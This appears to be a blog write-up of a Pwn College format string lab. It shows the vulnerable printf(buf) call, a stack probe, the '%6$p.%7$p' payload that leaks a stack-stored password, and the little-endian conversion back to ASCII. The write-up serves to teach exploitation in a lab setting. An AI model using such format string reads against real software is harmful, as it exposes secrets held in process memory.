---
layout: post
title: babyfmt_level1.0
date: 2026-06-29 23:02 -0400
published: true
categories: ["Binary Exploitation","Pwn College"]
tags: ["Format String Vulnerability", "Static analysis","PIEs"]
toc: true
---
# Format String Vulnerability

## Vulnerability Analysis

### Root Cause

The program reads up to 256 bytes from the user and passes them directly to `printf()` without specifying a format string:

```c
char buf[256];
read(0, buf, 256);
printf(buf);  // ← FORMAT STRING VULNERABILITY
```

When `printf()` is called with user-controlled data as the format string, an attacker can use format specifiers (`%p`, `%s`, `%n`, etc.) to read from or write to memory.

### Challenge Goal

The program generates a random 15-character uppercase password and stores it on the stack. The goal is to use a format string attack to read the password from the stack, then submit it to get the flag.

### Mitigations

- **PIE**: Enabled (but irrelevant since we only read, not write)
- **No stack canary** for the password
- Format string size limited to 256 bytes
- The password is on the stack, making it accessible via format string reads

## Exploit Strategy

### Understanding Stack Positions

In x86_64 calling convention, `printf` arguments are:
- `%1$` → RSI (first variadic argument)
- `%2$` → RDX
- `%3$` → RCX
- `%4$` → R8
- `%5$` → R9
- `%6$` → first value on stack (RSP+0)
- `%7$` → RSP+8
- ...and so on

### Finding the Password

The binary displays a helpful stack layout showing the password's position *before* `printf` is called. However, by the time `printf` executes, the actual stack pointer has changed due to the calling convention. 

We probed stack positions 1-15 with `%1$p.%2$p...%15$p` and found the password bytes at **positions 6 and 7**:

```
%6$p = 0x4e5752474a474841  → first 8 bytes of password
%7$p = 0x4d4844595a5241    → remaining 7 bytes + null
```

### Byte Conversion (Little-Endian)

Values on the stack are stored in little-endian format. The hex value `0x4e5752474a474841` is read as:
- Bytes: `[41, 48, 47, 4a, 47, 52, 57, 4e]` 
- ASCII: `A H G J G R W N` → `"AHGJGRWN"`

We use `p64()` from pwntools to handle this conversion:
```python
p1_hex = int("0x4e5752474a474841", 16)
p1_bytes = p64(p1_hex)  # packs in little-endian → b'AHGJGRWN'
```

### Exploit Payload

```python
payload = b'%6$p.%7$p'  # Leak both halves of the password
```

After receiving the hex values, we convert to ASCII, concatenate, and submit the password.

## Step-by-Step Walkthrough

### Step 1: Probe Stack Positions

First, we ran a probe to identify where the password lives on the stack:

```
%1$p = 0x70aedc277723     # RSI
%2$p = (nil)              # RDX
%3$p = 0x70aedc193523     # RCX
%4$p = 0xa                # R8
%5$p = 0x7ffc2da10c16     # R9
%6$p = 0x4a484a48574a4843 # ← PASSWORD (first 8 bytes)!
%7$p = 0x534a414a564e55   # ← PASSWORD (last 7 bytes)!
%8$p = (nil)
...
```

The values at positions 6 and 7 contain printable ASCII in the uppercase letter range (0x41-0x5A), confirming they are the password.

### Step 2: Leak the Password

We send `%6$p.%7$p` and receive:
```
0x4e5752474a474841.0x4d4844595a5241
```

### Step 3: Convert to ASCII

| Hex Value            | LE Bytes                    | ASCII       |
| -------------------- | --------------------------- | ----------- |
| `0x4e5752474a474841` | `[41 48 47 4a 47 52 57 4e]` | `AHGJGRWN`  |
| `0x4d4844595a5241`   | `[41 52 5a 59 44 48 4d 00]` | `ARZYDHM\0` |

Password: `AHGJGRWNARZYDHM` (15 chars)


## Key Takeaways

1. **Format string `%p` reads stack values** — useful for leaking data like passwords
2. **Stack positions can shift** between the "expected" layout and what `printf` actually sees, due to calling convention overhead — always probe to verify
3. **Little-endian byte order** matters when interpreting raw bytes as hex values
4. **pwntools `p64()`** is a convenient way to convert uint64 → bytes in little-endian format
5. **Positional format specifiers** (`%6$p`) are more precise than sequential ones when you know exactly which stack offset holds your target data
